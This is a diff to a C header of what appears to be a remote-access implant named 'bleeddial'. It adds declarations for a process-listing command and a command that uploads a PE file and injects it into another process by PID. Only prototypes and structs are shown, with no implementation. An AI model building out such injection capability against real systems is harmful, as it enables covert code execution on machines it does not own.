@@ -84,3 +84,32 @@ struct runcode_params_t {
 };
 
 DWORD WINAPI thread_runcode(struct runcode_params_t* params);
+
+/*
+	Enumerates processes using CreateToolhelp32Snapshot.
+*/
+struct pst32_params_t {
+	struct bleeddial_ctx_t* ctx;
+	endpoint_id_t endpoint_id;
+};
+
+struct _pst32_proc_t {
+	uint32_t proc_id;
+	wchar_t exe_name[255];
+};
+
+DWORD WINAPI thread_pst32(struct pst32_params_t* params);
+
+/*
+	Uploads and injects an PE into another process.
+*/
+struct inject_params_t {
+	struct bleeddial_ctx_t* ctx;
+	endpoint_id_t endpoint_id;
+
+	char local_path[255];
+	size_t local_path_len;
+	uint32_t target_pid;
+};
+
+DWORD WINAPI thread_inject(struct inject_params_t* params);
